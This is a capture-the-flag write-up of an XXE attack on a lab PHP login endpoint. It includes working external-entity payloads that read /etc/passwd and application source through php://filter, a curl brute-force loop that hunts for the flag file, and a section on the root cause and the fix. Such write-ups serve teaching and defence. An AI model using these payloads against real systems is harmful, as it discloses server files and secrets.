# XXE CTF Writeup — PentestGarage

**Challenge:** XXE
**Category:** Web Security
**Difficulty:** Medium
**Points:** 200
**Target:** `ctf-akshay-xxe-0e74a96d.challenges.pentestgarage.com:80`

## Summary

The target is a login page that submits credentials as raw XML to a PHP
backend. The backend parses that XML with `DOMDocument::loadXML()` using
`LIBXML_NOENT | LIBXML_DTDLOAD`, which enables external entity expansion —
a classic XXE vulnerability. This allowed arbitrary local file disclosure,
used to retrieve the flag.

## Recon

The front page (`/`) is a simple login form. Its client-side JS
(`/js/main.js`) revealed how the form is actually submitted:

```js
xmlhttp.open("POST", "/login.php", true);
xmlhttp.send(login_req);
```

with the request body built as:

```xml
<?xml version="1.0" encoding="utf-8"?>
<login>
  <username>USERNAME</username>
  <password>PASSWORD</password>
</login>
```

So the injection point is the `username`/`password` fields of the XML body
POSTed to `/login.php`.

## Step 1 — Confirm XXE

Payload:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE login [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<login>
  <username>&xxe;</username>
  <password>test</password>
</login>
```

```bash
curl -s -X POST http://ctf-akshay-xxe-0e74a96d.challenges.pentestgarage.com/login.php \
  -H "Content-Type: application/xml" \
  --data-binary @payload.xml
```

The response reflected the username back in the app's greeting message —
and `/etc/passwd` came back in full. XXE confirmed, with output reflected
directly in the response (no need for out-of-band exfiltration).

## Step 2 — Read the application source

Using the PHP `php://filter` wrapper to base64-encode the source so it
doesn't break the XML parser or get interpreted as PHP:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=login.php">
```

Decoded (`base64 -d`) result:

```php
<?php
$xmlfile = file_get_contents('php://input');

$dom = new DOMDocument();

$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);

$info = simplexml_import_dom($dom);

$username = $info->username;
$password = $info->password;

echo "Hello! $username!, Thanks for visiting us but all of our services are currently disabled cause of a recent security breach!";
?>
```

This confirmed the root cause: `LIBXML_NOENT | LIBXML_DTDLOAD` explicitly
enables entity substitution and external DTD loading — the two flags
responsible for XXE being exploitable here. The app also revealed its
absolute path via PHP warnings: `/var/www/html/login.php`.

## Step 3 — Locate and retrieve the flag

Brute-forced a short list of common flag file locations by swapping the
`SYSTEM` value and re-sending the request in a loop:

```bash
for path in "flag.txt" "flag" "var/www/html/flag.txt" "app/flag.txt" \
            "root/flag.txt" "home/flag.txt" "var/flag.txt" "tmp/flag.txt"; do
  echo "=== /$path ==="
  cat <<EOF > /tmp/xxe_test.xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE login [
  <!ENTITY xxe SYSTEM "file:///$path">
]>
<login>
<username>&xxe;</username>
<password>test</password>
</login>
EOF
  curl -s -X POST http://ctf-akshay-xxe-0e74a96d.challenges.pentestgarage.com/login.php \
    -H "Content-Type: application/xml" \
    --data-binary @/tmp/xxe_test.xml
  echo -e "\n"
done
```

`file:///flag.txt` (flag at the filesystem root) returned the flag
immediately; every other path failed with a DOM/XML loading warning,
confirming the file simply didn't exist at those locations.

## Flag

```
ctf{sup3r_e4sy_xx3_!nj3ct!ons}
```

## Root cause & fix

- **Root cause:** `DOMDocument::loadXML()` was called with
  `LIBXML_NOENT` (expand entities) and `LIBXML_DTDLOAD` (load external
  DTDs) enabled, with no restriction on entity resolution and no input
  validation on the submitted XML.
- **Fix:** Disable external entity loading entirely. In PHP:
  ```php
  $dom->loadXML($xmlfile, LIBXML_DTDLOAD & ~LIBXML_DTDLOAD); // i.e. don't set it
  // or, more directly:
  libxml_disable_entity_loader(true); // pre-PHP 8.0
  ```
  As of PHP 8.0+, external entity loading is disabled by default unless
  explicitly enabled — so simply not setting `LIBXML_NOENT` /
  `LIBXML_DTDLOAD` (or removing them) closes this hole. More broadly:
  never parse untrusted XML with entity/DTD resolution enabled, and
  prefer a strict schema-validated parser or a non-XML data format
  (JSON) for user input where possible.

## Notes / gotchas hit during the exercise

- Directly reading PHP source via `file://` breaks the XML parser
  (PHP tags + XML don't mix) — routing through
  `php://filter/convert.base64-encode/resource=<file>` avoids that.
- A local shell hiccup temporarily unset `$PATH`, breaking `cat`/`curl`
  lookups by name; fixed with
  `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
  or by using absolute binary paths (`/usr/bin/curl`, `/bin/cat`).
